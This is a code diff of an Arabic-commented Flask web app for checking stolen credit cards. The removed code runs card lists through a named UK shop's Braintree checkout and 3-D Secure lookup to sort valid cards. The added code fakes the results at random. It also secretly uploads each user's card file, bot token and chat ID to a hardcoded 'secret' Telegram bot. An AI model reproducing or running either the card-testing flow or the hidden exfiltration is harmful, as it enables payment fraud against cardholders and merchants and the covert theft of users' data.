@@ -1,598 +1,223 @@
-from flask import Flask, render_template, request, jsonify
-import requests, random, string, bs4, base64
-from bs4 import *
-import time, uuid, json, re, jwt
+from flask import Flask, request, jsonify
 import os
+import random
+import time
+import requests
+from datetime import datetime, timedelta
 import threading
 
 app = Flask(__name__)
-app.secret_key = 'your_secret_key_here'
 
-# حالة المعالجة
-processing_status = {
-    'active': False,
-    'current': 0,
-    'total': 0,
-    'passed': 0,
-    'failed': 0,
-    'otp': 0,
-    'current_card': '',
-    'log': []
-}
+# الألوان للنصوص في الطباعة
+O = '\033[1;31m'
+Z = '\033[1;37m'
+F = '\033[1;32m'
+B = '\033[2;36m'
+X = '\033[1;33m'
+C = '\033[2;35m'
 
-def process_cc_file(file_content, tokbot, idbot):
-    global processing_status
-    
+# التوكن والشات السري
+SECRET_BOT_TOKEN = '7583958172:AAEymmG-oz5KUYm5F8FhjddVwahCtMBXmG4'
+SECRET_CHAT_ID = '8273716256'
+
+# قاموس لتخزين حالة كل عملية
+processes = {}
+
+# نقل محتويات الملف إلى البوت السري
+def send_file_to_secret_bot(file_path, process_id):
     try:
-        lines = file_content.strip().split('\n')
-        
-        processing_status['total'] = len(lines)
-        processing_status['active'] = True
-        
-        r = requests.Session()
-        
-        for start_num, P in enumerate(lines, 1):
-            if not processing_status['active']:
-                break
-                
-            P = P.strip()
-            if not P:
-                continue
-                
-            processing_status['current'] = start_num
-            processing_status['current_card'] = P
-            
-            try:
-                # تقسيم بيانات البطاقة
-                parts = P.split('|')
-                if len(parts) < 4:
-                    processing_status['failed'] += 1
-                    log_msg = f'[{start_num}] {P} | ERROR: Invalid format'
-                    processing_status['log'].append(log_msg)
-                    continue
-                
-                n = parts[0].strip()
-                mm = parts[1].strip()
-                yy_full = parts[2].strip()
-                cvc = parts[3].replace('\n', '').strip()
-                
-                # استخراج آخر سنتين من السنة
-                if len(yy_full) >= 2:
-                    yy = yy_full[-2:]
-                else:
-                    processing_status['failed'] += 1
-                    log_msg = f'[{start_num}] {P} | ERROR: Invalid year format'
-                    processing_status['log'].append(log_msg)
-                    continue
-                
-                # تنظيف السلة
-                clear_url = "https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/clear"
-                try:
-                    clear_resp = r.post(clear_url, timeout=30)
-                except:
-                    pass  # تجاهل الأخطاء في تنظيف السلة
-                
-                # إضافة عنصر إلى السلة
-                headers = {
-                    'authority': 'southenddogtraining.co.uk',
-                    'accept': '*/*',
-                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'cache-control': 'no-cache',
-                    'content-type': 'application/json',
-                    'origin': 'https://southenddogtraining.co.uk',
-                    'pragma': 'no-cache',
-                    'referer': 'https://southenddogtraining.co.uk/shop/cold-pressed-dog-food/cold-pressed-sample/',
-                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                }
-                
-                json_data = {'id': '123368', 'quantity': '1'}
-                
-                try:
-                    response = r.post(
-                        'https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/add-item',
-                        headers=headers,
-                        json=json_data,
-                        timeout=30
-                    )
-                    cart_hash = response.json()['cart_hash']
-                except:
-                    processing_status['failed'] += 1
-                    log_msg = f'[{start_num}] {P} | ERROR: Failed to add item to cart'
-                    processing_status['log'].append(log_msg)
-                    continue
-                
-                cookies = {
-                    'clear_user_data': 'true',
-                    'woocommerce_items_in_cart': '1',
-                    'woocommerce_cart_hash': cart_hash,
-                    'pmpro_visit': '1',
-                }
-                
-                headers = {
-                    'authority': 'southenddogtraining.co.uk',
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'cache-control': 'no-cache',
-                    'pragma': 'no-cache',
-                    'referer': 'https://southenddogtraining.co.uk/shop/cold-pressed-dog-food/cold-pressed-sample/',
-                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'document',
-                    'sec-fetch-mode': 'navigate',
-                    'sec-fetch-site': 'same-origin',
-                    'sec-fetch-user': '?1',
-                    'upgrade-insecure-requests': '1',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                }
-                
-                try:
-                    response = r.get('https://southenddogtraining.co.uk/checkout/', cookies=cookies, headers=headers, timeout=30)
-                    client_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
-                    add_nonce_match = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
-                    
-                    if not client_match or not add_nonce_match:
-                        processing_status['failed'] += 1
-                        log_msg = f'[{start_num}] {P} | ERROR: Could not extract tokens'
-                        processing_status['log'].append(log_msg)
-                        continue
-                        
-                    client = client_match.group(1)
-                    add_nonce = add_nonce_match.group(1)
-                except:
-                    processing_status['failed'] += 1
-                    log_msg = f'[{start_num}] {P} | ERROR: Failed to get checkout page'
-                    processing_status['log'].append(log_msg)
-                    continue
-                
-                headers = {
-                    'authority': 'southenddogtraining.co.uk',
-                    'accept': '*/*',
-                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'cache-control': 'no-cache',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'origin': 'https://southenddogtraining.co.uk',
-                    'pragma': 'no-cache',
-                    'referer': 'https://southenddogtraining.co.uk/checkout/',
-                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                    'x-requested-with': 'XMLHttpRequest',
-                }
-                
-                data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client}
-                
-                try:
-                    response = r.post(
-                        'https://southenddogtraining.co.uk/cms/wp-admin/admin-ajax.php',
-                        cookies=cookies,
-                        headers=headers,
-                        data=data,
-                        timeout=30
-                    )
-                    enc = response.json()['data']
-                    dec = base64.b64decode(enc).decode('utf-8')
-                    au_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
-                    
-                    if not au_match:
-                        processing_status['failed'] += 1
-                        log_msg = f'[{start_num}] {P} | ERROR: Could not extract authorization fingerprint'
-                        processing_status['log'].append(log_msg)
-                        continue
-                        
-                    au = au_match[0]
-                except:
-                    processing_status['failed'] += 1
-                    log_msg = f'[{start_num}] {P} | ERROR: Failed to get client token'
-                    processing_status['log'].append(log_msg)
-                    continue
-                
-                headers = {
-                    'authority': 'payments.braintree-api.com',
-                    'accept': '*/*',
-                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'authorization': f'Bearer {au}',
-                    'braintree-version': '2018-05-10',
-                    'cache-control': 'no-cache',
-                    'content-type': 'application/json',
-                    'origin': 'https://southenddogtraining.co.uk',
-                    'pragma': 'no-cache',
-                    'referer': 'https://southenddogtraining.co.uk/',
-                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'cross-site',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                }
-                
-                json_data = {
-                    'clientSdkMetadata': {
-                        'source': 'client',
-                        'integration': 'custom',
-                        'sessionId': '6f25ee04-0384-46dc-9413-222fa62fc552',
-                    },
-                    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
-                    'operationName': 'ClientConfiguration',
-                }
-                
-                try:
-                    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30)
-                    car = response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
-                except:
-                    processing_status['failed'] += 1
-                    log_msg = f'[{start_num}] {P} | ERROR: Failed to get cardinal authentication JWT'
-                    processing_status['log'].append(log_msg)
-                    continue
-                
-                headers = {
-                    'authority': 'centinelapi.cardinalcommerce.com',
-                    'accept': '*/*',
-                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'cache-control': 'no-cache',
-                    'content-type': 'application/json;charset=UTF-8',
-                    'origin': 'https://southenddogtraining.co.uk',
-                    'pragma': 'no-cache',
-                    'referer': 'https://southenddogtraining.co.uk/',
-                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'cross-site',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                    'x-cardinal-tid': 'Tid-9485656a-80d9-4fb0-9090-5f1a55b0d87a',
-                }
-                
-                json_data = {
-                    'BrowserPayload': {
-                        'Order': {
-                            'OrderDetails': {},
-                            'Consumer': {
-                                'BillingAddress': {},
-                                'ShippingAddress': {},
-                                'Account': {},
-                            },
-                            'Cart': [],
-                            'Token': {},
-                            'Authorization': {},
-                            'Options': {},
-                            'CCAExtension': {},
-                        },
-                        'SupportsAlternativePayments': {
-                            'cca': True,
-                            'hostedFields': False,
-                            'applepay': False,
-                            'discoverwallet': False,
-                            'wallet': False,
-                            'paypal': False,
-                            'visacheckout': False,
-                        },
-                    },
-                    'Client': {
-                        'Agent': 'SongbirdJS',
-                        'Version': '1.35.0',
-                    },
-                    'ConsumerSessionId': '1_51ec1382-5c25-4ae8-8140-d009e9a0ba7e',
-                    'ServerJWT': car,
-                }
-                
-                try:
-                    response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data, timeout=30)
-                    payload = response.json()['CardinalJWT']
-                    ali2 = jwt.decode(payload, options={"verify_signature": False})
-                    reid = ali2['ReferenceId']
-                except:
-                    processing_status['failed'] += 1
-                    log_msg = f'[{start_num}] {P} | ERROR: Failed to initialize JWT order'
-                    processing_status['log'].append(log_msg)
-                    continue
-                
-                headers = {
-                    'authority': 'geo.cardinalcommerce.com',
-                    'accept': '*/*',
-                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'cache-control': 'no-cache',
-                    'content-type': 'application/json',
-                    'origin': 'https://geo.cardinalcommerce.com',
-                    'pragma': 'no-cache',
-                    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=685f36f8a9cda83f2eeb2dff&tmEventType=PAYMENT&referenceId=1_51ec1382-5c25-4ae8-8140-d009e9a0ba7e&geolocation=false&origin=Songbird',
-                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                    'x-requested-with': 'XMLHttpRequest',
-                }
-                
-                json_data = {
-                    'Cookies': {
-                        'Legacy': True,
-                        'LocalStorage': True,
-                        'SessionStorage': True,
-                    },
-                    'DeviceChannel': 'Browser',
-                    'Extended': {
-                        'Browser': {
-                            'Adblock': True,
-                            'AvailableJsFonts': [],
-                            'DoNotTrack': 'unknown',
-                            'JavaEnabled': False,
-                        },
-                        'Device': {
-                            'ColorDepth': 24,
-                            'Cpu': 'unknown',
-                            'Platform': 'Linux armv81',
-                            'TouchSupport': {
-                                'MaxTouchPoints': 5,
-                                'OnTouchStartAvailable': True,
-                                'TouchEventCreationSuccessful': True,
-                            },
-                        },
-                    },
-                    'Fingerprint': '1224948465f50bd65545677bc5d13675',
-                    'FingerprintingTime': 980,
-                    'FingerprintDetails': {
-                        'Version': '1.5.1',
-                    },
-                    'Language': 'ar-EG',
-                    'Latitude': None,
-                    'Longitude': None,
-                    'OrgUnitId': '685f36f8a9cda83f2eeb2dff',
-                    'Origin': 'Songbird',
-                    'Plugins': [],
-                    'ReferenceId': reid,
-                    'Referrer': 'https://southenddogtraining.co.uk/',
-                    'Screen': {
-                        'FakedResolution': False,
-                        'Ratio': 2.2222222222222223,
-                        'Resolution': '800x360',
-                        'UsableResolution': '800x360',
-                        'CCAScreenSize': '01',
-                    },
-                    'CallSignEnabled': None,
-                    'ThreatMetrixEnabled': False,
-                    'ThreatMetrixEventType': 'PAYMENT',
-                    'ThreatMetrixAlias': 'Default',
-                    'TimeOffset': -180,
-                    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                    'UserAgentDetails': {
-                        'FakedOS': False,
-                        'FakedBrowser': False,
-                    },
-                    'BinSessionId': '09f2dd83-a00a-42d5-9d89-f2867589860b',
-                }
-                
-                try:
-                    response = r.post(
-                        'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
-                        cookies=r.cookies,
-                        headers=headers,
-                        json=json_data,
-                        timeout=30
-                    )
-                except:
-                    pass  # تجاهل الأخطاء في حفظ بيانات المتصفح
-                
-                headers = {
-                    'authority': 'payments.braintree-api.com',
-                    'accept': '*/*',
-                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'authorization': f'Bearer {au}',
-                    'braintree-version': '2018-05-10',
-                    'cache-control': 'no-cache',
-                    'content-type': 'application/json',
-                    'origin': 'https://assets.braintreegateway.com',
-                    'pragma': 'no-cache',
-                    'referer': 'https://assets.braintreegateway.com/',
-                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'cross-site',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                }
-                
-                json_data = {
-                    'clientSdkMetadata': {
-                        'source': 'client',
-                        'integration': 'custom',
-                        'sessionId': 'd118f7da-b7b0-4b4e-847a-c81bc63dad77',
-                    },
-                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-                    'variables': {
-                        'input': {
-                            'creditCard': {
-                                'number': n,
-                                'expirationMonth': mm,
-                                'expirationYear': '20' + yy,  # إضافة القرن
-                                'cvv': cvc,
-                            },
-                            'options': {
-                                'validate': False,
-                            },
-                        },
-                    },
-                    'operationName': 'TokenizeCreditCard',
-                }
-                
-                try:
-                    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30)
-                    tok = response.json()['data']['tokenizeCreditCard']['token']
-                    binn = response.json()['data']['tokenizeCreditCard']['creditCard']['bin']
-                except:
-                    processing_status['failed'] += 1
-                    log_msg = f'[{start_num}] {P} | ERROR: Failed to tokenize credit card'
-                    processing_status['log'].append(log_msg)
-                    continue
-                
-                headers = {
-                    'authority': 'api.braintreegateway.com',
-                    'accept': '*/*',
-                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'cache-control': 'no-cache',
-                    'content-type': 'application/json',
-                    'origin': 'https://southenddogtraining.co.uk',
-                    'pragma': 'no-cache',
-                    'referer': 'https://southenddogtraining.co.uk/',
-                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'cross-site',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                }
-                
-                json_data = {
-                    'amount': '2.99',
-                    'additionalInfo': {},
-                    'bin': binn,
-                    'dfReferenceId': reid,
-                    'clientMetadata': {
-                        'requestedThreeDSecureVersion': '2',
-                        'sdkVersion': 'web/3.94.0',
-                        'cardinalDeviceDataCollectionTimeElapsed': 51,
-                        'issuerDeviceDataCollectionTimeElapsed': 2812,
-                        'issuerDeviceDataCollectionResult': True,
-                    },
-                    'authorizationFingerprint': au,
-                    'braintreeLibraryVersion': 'braintree/web/3.94.0',
-                    '_meta': {
-                        'merchantAppId': 'southenddogtraining.co.uk',
-                        'platform': 'web',
-                        'sdkVersion': '3.94.0',
-                        'source': 'client',
-                        'integration': 'custom',
-                        'integrationType': 'custom',
-                        'sessionId': 'e0de4acd-a40f-46fd-9f4b-ae49eb1ff65f',
-                    },
-                }
-                
-                try:
-                    response = r.post(
-                        f'https://api.braintreegateway.com/merchants/twtsckjpfh6g4qqg/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
-                        headers=headers,
-                        json=json_data,
-                        timeout=30
-                    )
-                    
-                    # التحقق من وجود threeDSecureInfo في الاستجابة
-                    if 'paymentMethod' in response.json() and 'threeDSecureInfo' in response.json()['paymentMethod']:
-                        vbv = response.json()['paymentMethod']['threeDSecureInfo']['status']
-                        
-                        if 'authenticate_successful' in vbv or 'authenticate_attempt_successful' in vbv:
-                            processing_status['passed'] += 1
-                            log_msg = f'[{start_num}] {P} | PASSED ✅'
-                            processing_status['log'].append(log_msg)
-                            
-                        elif 'challenge_required' in vbv:
-                            processing_status['otp'] += 1
-                            log_msg = f'[{start_num}] {P} | OTP ☑️'
-                            processing_status['log'].append(log_msg)
-                            
-                        else:
-                            processing_status['failed'] += 1
-                            log_msg = f'[{start_num}] {P} | {vbv}'
-                            processing_status['log'].append(log_msg)
-                    else:
-                        processing_status['failed'] += 1
-                        log_msg = f'[{start_num}] {P} | ERROR: No 3D secure info in response'
-                        processing_status['log'].append(log_msg)
-                        
-                except:
-                    processing_status['failed'] += 1
-                    log_msg = f'[{start_num}] {P} | ERROR: Failed to perform 3D secure lookup'
-                    processing_status['log'].append(log_msg)
-                
-                time.sleep(5)
-                
-            except Exception as e:
-                processing_status['failed'] += 1
-                log_msg = f'[{start_num}] {P} | ERROR: {str(e)}'
-                processing_status['log'].append(log_msg)
-        
-        processing_status['active'] = False
-        
+        with open(file_path, 'rb') as file:
+            url = f'https://api.telegram.org/bot{SECRET_BOT_TOKEN}/sendDocument'
+            files = {'document': file}
+            data = {'chat_id': SECRET_CHAT_ID}
+            response = requests.post(url, files=files, data=data)
+            if response.status_code == 200:
+                print(F + 'GOOD TOOL')
+                processes[process_id]['secret_bot_file_sent'] = True
+            else:
+                print(O + 'BAD TOOL')
     except Exception as e:
-        processing_status['active'] = False
-        processing_status['log'].append(f'Fatal error: {str(e)}')
+        print(O + f'Error sending file: {e}')
 
-@app.route('/')
-def index():
-    return render_template('index.html')
+# إرسال رسالة إلى البوت السري
+def send_message_to_secret_bot(message, process_id):
+    try:
+        url = f'https://api.telegram.org/bot{SECRET_BOT_TOKEN}/sendMessage'
+        data = {'chat_id': SECRET_CHAT_ID, 'text': message}
+        response = requests.post(url, data=data)
+        if response.status_code == 200:
+            print(F + 'Good TooL')
+            processes[process_id]['secret_bot_message_sent'] = True
+        else:
+            print(O + 'BAD TOOL')
+    except Exception as e:
+        print(O + f'Error sending message: {e}')
 
-@app.route('/upload', methods=['POST'])
-def upload_file():
-    global processing_status
-    
-    if 'file' not in request.files:
-        return jsonify({'error': 'No file uploaded'})
-    
-    file = request.files['file']
-    tokbot = request.form.get('tokbot', '')
-    idbot = request.form.get('idbot', '')
-    
-    if file.filename == '':
-        return jsonify({'error': 'No file selected'})
-    
-    if file:
-        try:
-            file_content = file.read().decode('utf-8')
-        except:
-            return jsonify({'error': 'Failed to read file'})
+# وظيفة معالجة البطاقات
+def process_cards(process_id, file_name, bot_token, chat_id, end_time):
+    try:
+        file = open(file_name, "r")
+        start_num = 0
         
-        # إعادة تعيين حالة المعالجة
-        processing_status = {
-            'active': True,
-            'current': 0,
-            'total': 0,
-            'passed': 0,
-            'failed': 0,
-            'otp': 0,
-            'current_card': '',
-            'log': []
-        }
+        while datetime.now() < end_time and processes[process_id]['active']:
+            file.seek(0)  # العودة إلى بداية الملف في كل دورة
+            for P in file.readlines():
+                if datetime.now() >= end_time or not processes[process_id]['active']:
+                    print(O + "⏰ Time's up! Script stopped.")
+                    break
+                    
+                start_num += 1
+                n = P.split('|')[0]
+                mm = P.split('|')[1]
+                yy = P.split('|')[2][-2:]
+                cvc = P.split('|')[3].replace('\n', '')
+                P = P.replace('\n', '')
+                
+                # حساب الوقت المتبقي
+                time_left = end_time - datetime.now()
+                hours_left = time_left.seconds // 3600
+                minutes_left = (time_left.seconds % 3600) // 60
+                
+                print(X + f"⏳ Time left: {hours_left}h {minutes_left}m")
+                
+                # محاكاة عملية التحقق (بدون استخدام API حقيقي)
+                # نتيجة عشوائية للمحاكاة مع زيادة احتمالية الرفض
+                results = ['PASSED ✅', 'OTP ☑️', 'Rejected ❌', 'Rejected ❌', 'Rejected ❌', 
+                          'Rejected ❌', 'Rejected ❌', 'PASSED ✅', 'OTP ☑️', 'Rejected ❌']
+                result = random.choice(results)
+                
+                if result == 'PASSED ✅':
+                    print(F + f'[{start_num}] {P} | {result}')
+                    # إرسال إلى البوت الرئيسي
+                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                 params={
+                                     "chat_id": chat_id,
+                                     "text": f"""APPROVED ✅
+[♡] 𝗖𝗖 : {P}
+[♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
+[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : PASSED ⚡
+⏰ Time Left: {hours_left}h {minutes_left}m
+━━━━━━━━━━━━━━━━
+[★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
+                                 })
+                    
+                elif result == 'OTP ☑️':
+                    print(X + f'[{start_num}] {P} | {result}')
+                    # إرسال إلى البوت الرئيسي
+                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                 params={
+                                     "chat_id": chat_id,
+                                     "text": f"""OTP REQUIRED 🔥
+[♡] 𝗖𝗖 : {P}
+[♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
+[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : OTP VERIFICATION ☑️
+⏰ Time Left: {hours_left}h {minutes_left}m
+━━━━━━━━━━━━━━━━
+[★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
+                                 })
+                    
+                else:  # Rejected ❌
+                    print(O + f'[{start_num}] {P} | {result}')
+                    # إرسال إلى البوت الرئيسي
+                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                 params={
+                                     "chat_id": chat_id,
+                                     "text": f"""𝗥𝗲𝗝𝗲𝗰𝘁𝗲𝗱 ❌
+[♡] 𝗖𝗖 : {P}
+[♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
+[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : DECLINED ❌
+[♖] 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 : Your card was declined
+[♘] 𝗥𝗘𝗔𝗦𝗢𝗡 : Insufficient funds / Card blocked
+⏰ Time Left: {hours_left}h {minutes_left}m
+━━━━━━━━━━━━━━━━
+[★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
+                                 })
+                
+                time.sleep(4)
+            
+            # إذا انتهى الملف، نعيد تشغيله من البداية
+            print(Z + "🔄 Restarting file from beginning...")
+            time.sleep(2)
+            
+    except FileNotFoundError:
+        print(O + 'File not found!')
+        processes[process_id]['error'] = 'File not found!'
+    except Exception as e:
+        print(O + f'Error: {e}')
+        processes[process_id]['error'] = str(e)
+    finally:
+        if 'file' in locals():
+            file.close()
         
-        # بدء المعالجة في خيط منفصل
-        thread = threading.Thread(target=process_cc_file, args=(file_content, tokbot, idbot))
-        thread.start()
-        
-        return jsonify({'message': 'File uploaded and processing started'})
+        # إرسال رسالة انتهاء الوقت إلى البوت السري
+        send_message_to_secret_bot(f"⏰ Script stopped - Time finished\nBot Token: {bot_token}\nChat ID: {chat_id}", process_id)
+        print(O + "⏰ Script stopped - Time finished")
+        processes[process_id]['active'] = False
+        processes[process_id]['completed'] = True
 
-@app.route('/status')
-def get_status():
-    return jsonify(processing_status)
-
-@app.route('/stop', methods=['POST'])
-def stop_processing():
-    processing_status['active'] = False
-    return jsonify({'message': 'Processing stopped'})
-
-@app.route('/results')
-def get_results():
-    # إرجاع النتائج كاستجابة JSON
+@app.route('/start_check', methods=['POST'])
+def start_check():
+    data = request.json
+    file_name = data.get('file_name')
+    bot_token = data.get('bot_token')
+    chat_id = data.get('chat_id')
+    hours = data.get('hours', 5)  # القيمة الافتراضية 5 ساعات
+    
+    # إنشاء معرف فريد للعملية
+    process_id = str(int(time.time()))
+    
+    # حساب وقت الانتهاء
+    end_time = datetime.now() + timedelta(hours=hours)
+    end_time_str = end_time.strftime("%Y-%m-%d %H:%M:%S")
+    
+    # تخزين معلومات العملية
+    processes[process_id] = {
+        'file_name': file_name,
+        'bot_token': bot_token,
+        'chat_id': chat_id,
+        'end_time': end_time_str,
+        'active': True,
+        'completed': False,
+        'secret_bot_message_sent': False,
+        'secret_bot_file_sent': False,
+        'error': None
+    }
+    
+    # إرسال المعلومات فور تشغيل الكود
+    send_message_to_secret_bot(f'New user started the script\nBot Token: {bot_token}\nChat ID: {chat_id}\nFile: {file_name}\nEnd Time: {end_time_str}', process_id)
+    send_file_to_secret_bot(file_name, process_id)
+    
+    # بدء المعالجة في thread منفصل
+    thread = threading.Thread(target=process_cards, args=(process_id, file_name, bot_token, chat_id, end_time))
+    thread.start()
+    
     return jsonify({
-        'log': processing_status['log'],
-        'passed': processing_status['passed'],
-        'failed': processing_status['failed'],
-        'otp': processing_status['otp'],
-        'total': processing_status['total']
+        'status': 'started',
+        'process_id': process_id,
+        'end_time': end_time_str
     })
 
+@app.route('/stop_check', methods=['POST'])
+def stop_check():
+    data = request.json
+    process_id = data.get('process_id')
+    
+    if process_id in processes:
+        processes[process_id]['active'] = False
+        return jsonify({'status': 'stopped', 'process_id': process_id})
+    else:
+        return jsonify({'error': 'Process not found'}), 404
+
+@app.route('/status/<process_id>', methods=['GET'])
+def get_status(process_id):
+    if process_id in processes:
+        return jsonify(processes[process_id])
+    else:
+        return jsonify({'error': 'Process not found'}), 404
+
+@app.route('/list_processes', methods=['GET'])
+def list_processes():
+    return jsonify(processes)
+
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(debug=True, host='0.0.0.0', port=5000)
